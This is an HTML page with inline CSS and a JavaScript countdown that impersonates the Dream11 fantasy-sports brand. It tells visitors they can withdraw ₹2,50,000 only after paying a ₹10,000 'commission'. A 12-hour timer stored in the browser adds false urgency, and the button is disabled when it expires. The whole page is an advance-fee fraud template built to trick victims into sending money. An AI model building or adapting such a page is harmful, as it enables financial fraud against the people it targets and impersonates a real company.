<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #d90000;
      color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      padding: 30px 20px;
      border-radius: 25px;
      text-align: center;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
    }

    .logo {
      width: 60px;
      height: 60px;
    }

    .brand {
      color: #d90000;
      font-size: 18px;
      margin-top: 5px;
      font-weight: bold;
    }

    h2 {
      margin: 15px 0 10px;
    }

    .amount {
      font-size: 32px;
      font-weight: bold;
      color: green;
      margin: 10px 0;
    }

    .commission {
      font-size: 16px;
      margin: 15px 0;
    }

    .timer {
      color: red;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .btn {
      background-color: #28a745;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    .btn:disabled {
      background-color: #888;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="1000076818.png" alt="Dream11 Logo" class="logo" />
    <div class="brand">DREAM11</div>
    <h2>Withdrawal Page</h2>
    <p>Your withdrawal amount is:</p>
    <div class="amount">₹2,50,000</div>
    <p class="commission">You must pay ₹10,000 commission to proceed with withdrawal.</p>
    <div class="timer" id="timer">Time left: 12:00:00</div>
    <button class="btn" id="withdrawBtn">Withdraw Now</button>
  </div>

  <script>
    // Check if start time is already saved
    let startTime = localStorage.getItem("withdraw_start_time");

    if (!startTime) {
      startTime = new Date().getTime();
      localStorage.setItem("withdraw_start_time", startTime);
    } else {
      startTime = parseInt(startTime);
    }

    const countdownEl = document.getElementById("timer");
    const withdrawBtn = document.getElementById("withdrawBtn");

    function updateTimer() {
      const now = new Date().getTime();
      const distance = 12 * 60 * 60 * 1000 - (now - startTime); // 12 hours

      if (distance <= 0) {
        countdownEl.textContent = "Link Expired";
        withdrawBtn.disabled = true;
        withdrawBtn.textContent = "Link Expired";
        return;
      }

      const hours = Math.floor(distance / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      countdownEl.textContent = `Time left: ${String(hours).padStart(2, "0")}:${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
    }

    setInterval(updateTimer, 1000);
    updateTimer();
  </script>
</body>
</html>
